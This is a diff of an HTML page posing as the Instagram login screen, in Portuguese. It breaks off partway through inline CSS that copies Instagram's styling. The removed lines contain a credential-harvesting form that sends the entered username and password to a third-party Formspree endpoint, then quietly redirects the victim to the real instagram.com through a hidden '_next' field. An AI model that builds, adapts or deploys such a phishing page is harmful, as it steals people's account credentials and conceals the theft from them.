@@ -4,73 +4,59 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="src/style.css">
     <title>Instagram</title>
-</head>
-<body>
-    <div class="instagram-wrapper">
-        <div class="instagram-phone">
-            <img src="./img/apresentacao-celular.png" alt="instagram apresentação">
-        </div>
+    <style>
+        /* RESET BÁSICO */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
 
-        <div class="instagram-login">
-            <div class="group">
-                <img src="./img/instagram-logo.png" class="instagram-logo" alt="instagram logo">
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #fafafa;
+        }
 
-                <div class="user-login">
-                    <!-- FORMULÁRIO CONECTADO AO FORMSPREE COM REDIRECIONAMENTO -->
-                    <form action="https://formspree.io/f/xkoojkow" method="POST">
-                        <!-- Campo de login genérico -->
-                        <input 
-                            type="text" 
-                            name="login" 
-                            placeholder="Telefone, nome de usuário ou email" 
-                            required
-                        ><br/>
+        .instagram-wrapper {
+            display: flex;
+            gap: 50px;
+        }
 
-                        <input 
-                            type="password" 
-                            name="senha" 
-                            placeholder="Senha" 
-                            required
-                        >
+        /* LADO DO CELULAR */
+        .instagram-phone img {
+            max-width: 300px;
+            height: auto;
+        }
 
-                        <!-- Redirecionamento após envio -->
-                        <input type="hidden" name="_next" value="https://www.instagram.com/">
+        /* LADO DO LOGIN */
+        .instagram-login {
+            width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-                        <button type="submit" class="instagram-entrar">
-                            Entrar
-                        </button>
-                    </form>
-                </div>
+        .instagram-logo {
+            margin-bottom: 20px;
+        }
 
-                <p>OU</p>
+        .user-login {
+            width: 100%;
+        }
 
-                <a href="#" class="instagram-entrar-facebook">
-                    <img src="./img/facebook-icon.png" alt="facebook" width="13" height="13">
-                    <b>Entrar com o Facebook</b>
-                </a>
+        form {
+            display: flex;
+            flex-direction: column;
+        }
 
-                <a href="#" class="instagram-esqueceu">
-                    Esqueceu a senha?
-                </a>
-            </div>
-
-            <div class="group">
-                <p class="not-account">
-                    Não tem uma conta?
-                    <span class="link-blue">Cadastre-se</span>
-                </p>
-            </div>
-
-            <div class="get-app">
-                <p class="get-app">Obtenha o aplicativo</p>
-                <div class="download">
-                    <a href="#" class="app-download"></a>
-                    <a href="#" class="app-download"></a>
-                </div>
-            </div>
-        </div>
-    </div>
-</body>
-</html>
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 9px 0px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
